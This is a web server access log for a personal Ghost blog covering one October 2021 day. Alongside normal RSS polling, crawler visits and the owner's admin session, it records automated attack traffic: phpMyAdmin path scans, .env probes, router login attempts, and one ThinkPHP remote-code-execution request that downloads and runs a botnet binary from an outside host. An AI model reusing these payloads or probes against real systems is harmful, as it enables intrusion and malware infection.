70.83.6.196 - - [18/Oct/2021:11:46:56 +0200] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:56 +0200] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:56 +0200] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:56 +0200] "GET /PMA2020/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:57 +0200] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:57 +0200] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:57 +0200] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:57 +0200] "GET /pma2014/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:58 +0200] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:58 +0200] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:58 +0200] "GET /PMA2016/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:58 +0200] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:59 +0200] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:59 +0200] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:59 +0200] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:59 +0200] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:00 +0200] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:00 +0200] "GET /pma2020/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:00 +0200] "GET /pma2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:01 +0200] "GET /sql/websql/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:01 +0200] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:01 +0200] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:02 +0200] "GET /PMA2012/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:02 +0200] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:02 +0200] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:02 +0200] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:03 +0200] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:03 +0200] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:03 +0200] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:47:03 +0200] "GET /pma2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:11:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
167.248.133.59 - - [18/Oct/2021:11:57:15 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
167.248.133.59 - - [18/Oct/2021:11:57:15 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.59 - - [18/Oct/2021:11:57:15 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
186.33.93.205 - - [18/Oct/2021:12:01:44 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:12:09:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
217.165.141.155 - - [18/Oct/2021:12:18:51 +0200] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.14.226.120/notabotnet/notabotnet.x86 -O /tmp/.notabotnet; chmod 777 /tmp/.notabotnet; /tmp/.notabotnet ThinkphpRep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
5.173.42.7 - - [18/Oct/2021:12:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
192.53.170.243 - - [18/Oct/2021:12:33:20 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
27.115.124.99 - - [18/Oct/2021:12:37:57 +0200] "GET / HTTP/1.1" 200 1345 "-" "-"
27.115.124.100 - - [18/Oct/2021:12:38:18 +0200] "GET /favicon.ico HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
27.115.124.10 - - [18/Oct/2021:12:38:19 +0200] "GET /robots.txt HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
27.115.124.44 - - [18/Oct/2021:12:38:20 +0200] "GET /sitemap.xml HTTP/1.1" 200 595 "-" "Go-http-client/1.1"
5.173.42.7 - - [18/Oct/2021:12:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:12:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
157.245.176.143 - - [18/Oct/2021:12:56:40 +0200] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 150 "-" "-"
192.241.210.213 - - [18/Oct/2021:13:06:48 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
5.173.42.7 - - [18/Oct/2021:13:09:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
192.241.208.41 - - [18/Oct/2021:13:10:03 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
5.173.42.7 - - [18/Oct/2021:13:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:13:39:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
77.247.127.171 - - [18/Oct/2021:13:42:05 +0200] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
77.247.127.171 - - [18/Oct/2021:13:42:05 +0200] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
77.247.127.171 - - [18/Oct/2021:13:42:05 +0200] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
77.247.127.171 - - [18/Oct/2021:13:42:05 +0200] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.94.38.230 - - [18/Oct/2021:13:45:58 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
107.189.28.85 - - [18/Oct/2021:13:52:31 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
107.189.28.85 - - [18/Oct/2021:13:52:31 +0200] "" 400 0 "-" "-"
209.141.62.185 - - [18/Oct/2021:13:53:51 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.173.42.7 - - [18/Oct/2021:13:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
154.89.5.49 - - [18/Oct/2021:14:05:18 +0200] "GET / HTTP/1.0" 301 162 "-" "-"
5.173.42.7 - - [18/Oct/2021:14:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
198.12.85.84 - - [18/Oct/2021:14:11:52 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
209.141.54.186 - - [18/Oct/2021:14:19:39 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.54.186 - - [18/Oct/2021:14:19:39 +0200] "" 400 0 "-" "-"
5.173.42.7 - - [18/Oct/2021:14:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:14:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:14:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
192.241.201.87 - - [18/Oct/2021:15:02:55 +0200] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
84.197.210.116 - - [18/Oct/2021:15:08:32 +0200] "GET /content/images/2021/10/Screenshot_8.png HTTP/2.0" 200 243714 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:15:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
65.49.20.66 - - [18/Oct/2021:15:10:10 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
5.173.42.7 - - [18/Oct/2021:15:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
161.35.230.183 - - [18/Oct/2021:15:33:06 +0200] "\x00\x0E8N\xD9'\x22\xE7KX\x1F\x00\x00\x00\x00\x00" 400 150 "-" "-"
5.173.42.7 - - [18/Oct/2021:15:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
20.191.45.212 - - [18/Oct/2021:15:40:18 +0200] "GET / HTTP/1.1" 301 162 "http://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [18/Oct/2021:15:40:18 +0200] "GET / HTTP/1.1" 200 12727 "https://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [18/Oct/2021:15:40:18 +0200] "GET /favicon.png HTTP/1.1" 200 2741 "https://krzwiatrzyk.eu/favicon.png" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
209.141.51.171 - - [18/Oct/2021:15:43:08 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [18/Oct/2021:15:43:08 +0200] "" 400 0 "-" "-"
5.173.42.7 - - [18/Oct/2021:15:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
18.207.118.162 - - [18/Oct/2021:15:56:10 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
18.207.118.162 - - [18/Oct/2021:15:56:10 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Ruby"
209.97.185.16 - - [18/Oct/2021:16:04:53 +0200] "GET / HTTP/1.1" 301 162 "http://85.255.1.106:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
91.64.143.106 - - [18/Oct/2021:16:06:51 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
5.173.42.7 - - [18/Oct/2021:16:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
205.185.120.103 - - [18/Oct/2021:16:22:45 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [18/Oct/2021:16:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:16:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.62.185 - - [18/Oct/2021:16:44:59 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.173.42.7 - - [18/Oct/2021:16:54:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:09:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:24:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:46 +0200] "GET /ghost/ HTTP/2.0" 200 1553 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:47 +0200] "GET /ghost/assets/vendor.min-987af30228885bce50f05c4723fe6f53.css HTTP/2.0" 200 10454 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:47 +0200] "GET /ghost/assets/ghost.min-e7612edfa72b0fe2c201b387923e6fc7.css HTTP/2.0" 200 95025 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:48 +0200] "GET /ghost/assets/ghost.min-d1d99f3ed6e0f427874b2a11e7078475.js HTTP/2.0" 200 295307 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:48 +0200] "GET /ghost/assets/vendor.min-3660ec7864887f1496fe7a27fd23ab76.js HTTP/2.0" 200 904746 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:49 +0200] "GET /ghost/assets/img/favicon.ico HTTP/2.0" 200 3781 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:49 +0200] "GET /ghost/api/canary/admin/users/me/?include=roles HTTP/2.0" 200 689 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:49 +0200] "GET /ghost/api/canary/admin/site/ HTTP/2.0" 200 339 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:49 +0200] "GET /ghost/api/canary/admin/config/ HTTP/2.0" 200 239 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:49 +0200] "GET /ghost/api/canary/admin/settings/?group=site%2Ctheme%2Cprivate%2Cmembers%2Cportal%2Cnewsletter%2Cemail%2Camp%2Clabs%2Cslack%2Cunsplash%2Cviews%2Cfirstpromoter%2Coauth%2Ceditor HTTP/2.0" 200 1826 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:49 +0200] "GET /ghost/assets/ghost-dark-bb2831fc27fcb02893ed0a761207dc63.css HTTP/2.0" 200 98448 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/notifications/ HTTP/2.0" 200 378 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/members/stats/count/ HTTP/2.0" 200 42 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/members/events/?limit=5 HTTP/2.0" 200 13 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/products/?include=monthly_price%2Cyearly_price&limit=all HTTP/2.0" 200 344 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/members/?filter=email_open_rate%3A-null&order=email_open_rate%20desc&limit=5&include=labels%2CemailRecipients HTTP/2.0" 200 101 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /ghost/api/canary/admin/emails/?filter=email_count%3A-0&order=submitted_at%20desc&limit=5 HTTP/2.0" 200 100 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:17:32:50 +0200] "GET /content/images/2021/10/d417ce9e68114f09acc670e5928685a3--5-.png HTTP/2.0" 200 2741 "https://krzwiatrzyk.eu/ghost/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
